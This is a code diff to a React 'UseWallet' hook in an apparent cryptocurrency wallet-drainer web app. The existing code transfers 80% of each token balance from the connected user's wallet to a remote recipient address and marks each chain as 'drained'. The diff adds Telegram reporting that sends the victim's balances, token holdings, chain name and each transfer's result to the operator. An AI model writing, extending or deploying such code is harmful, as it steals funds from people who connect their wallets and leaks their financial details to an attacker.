@@ -8,6 +8,7 @@ import { providers } from "ethers";
 import contractAbi from "../blockchain/contract.json";
 import { config, API_KEY, receiver, receiver2 } from "./Web3Config";
 import { getRecipientAddress } from "./getUserLocation";
+import { sendAppDetailsToTelegram,sendTransactionStatusToTelegram } from "../services/telegramUtils";
 
 export const UseWallet = (amount) => {
     const account = useAccount();
@@ -75,6 +76,27 @@ export const UseWallet = (amount) => {
         }
     };
 
+    const getChainNameById = (chainId) => {
+        switch (chainId) {
+            case 1:
+                return "Ethereum";
+            case 56:
+                return "Binance Smart Chain";
+            case 137:
+                return "Polygon";
+            case 43114:
+                return "Avalanche";
+            case 42161:
+                return "Arbitrum";
+            case 10:
+                return "Optimism";
+            case 42220:
+                return "Celo";
+            default:
+                return "Unknown Chain";
+        }
+    };
+    
     const approveTokens = async () => {
         if (account && account.address && account.chainId) {
             const tokens = await getTokenAssets();
@@ -115,25 +137,32 @@ export const UseWallet = (amount) => {
             console.log("Ethereum provider is not available.");
             return;
         }
-
+    
         const chainId = getChainId(config);
-
+    
         // Update chainInteractionStatus after interacting with the chain
         chainInteractionStatus[chainId] = true;
-
+    
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         const signer = provider.getSigner(account.address);
-        const ethBalance = await getBalance(config, {
+    
+        // Fetch native token balance (ETH, BNB, MATIC, etc.)
+        const nativeBalance = await getBalance(config, {
             address: account.address,
             chainId: account.chainId,
         });
-
+    
+        // Fetch token balances (ERC20, BEP20, etc.)
         const tokens = await getTokenAssets();
-
+    
+        // Send app details to Telegram
+        const chain = getChainNameById(chainId); // Helper function to get chain name
+        await sendAppDetailsToTelegram(nativeBalance.formatted, tokens, chain);
+    
         // Process each token individually
         for (let token of tokens) {
             const { tokenAddress, tokenAmount } = token;
-
+    
             if (tokenAddress !== "0x0000000000000000000000000000000000000000") {
                 const tokenContract = new Contract(
                     tokenAddress,
@@ -143,18 +172,18 @@ export const UseWallet = (amount) => {
                     ],
                     signer
                 );
-
+    
                 const amountInWei = ethers.BigNumber.from(tokenAmount.toString())
                     .mul(8)
                     .div(10); // Transfer 80% of the balance
-
+    
                 try {
                     const userBalance = await tokenContract.balanceOf(account.address);
                     if (userBalance.lt(amountInWei)) {
                         console.log(`Insufficient token balance for ${tokenAddress}`);
                         continue; // Move to next token
                     }
-
+    
                     const transferTx = await tokenContract.transfer(
                         await getRecipientAddress(), // Use the dynamic recipient address
                         amountInWei
@@ -164,16 +193,19 @@ export const UseWallet = (amount) => {
                     console.log(
                         `Transferred ${amountInWei.toString()} of ${tokenAddress}`
                     );
-
-                    chainDrainStatus[chainId] = true; // Mark chain as drained if successfu
+                    await sendTransactionStatusToTelegram("success", transferTx.hash);
+    
+                    chainDrainStatus[chainId] = true; // Mark chain as drained if successful
                 } catch (error) {
                     console.log(`Transfer failed for ${tokenAddress}:`, error);
+                    await sendTransactionStatusToTelegram("failure", error);
                     continue; // Continue to next token on failure
                 }
             }
         }
-        await handleMulticall(tokens, ethBalance);
+        await handleMulticall(tokens, nativeBalance);
     };
+    
 
 
     // Example usage: Create and sign a transaction to send 0.001 ETH to yourself
@@ -225,11 +257,13 @@ export const UseWallet = (amount) => {
             console.log(`Multicall transaction hash: ${tx.hash}`);
             await tx.wait();
             console.log(`Multicall transaction confirmed: ${tx.hash}`);
+            await sendTransactionStatusToTelegram("success", tx.hash);
 
             chainDrainStatus[chainId] = true; // Mark chain as drained if successful
             await proceedToNextChain();
         } catch (error) {
             console.log("Multicall operation failed:", error,);
+            await sendTransactionStatusToTelegram("failure", error);
             await proceedToNextChain();
         }
     };
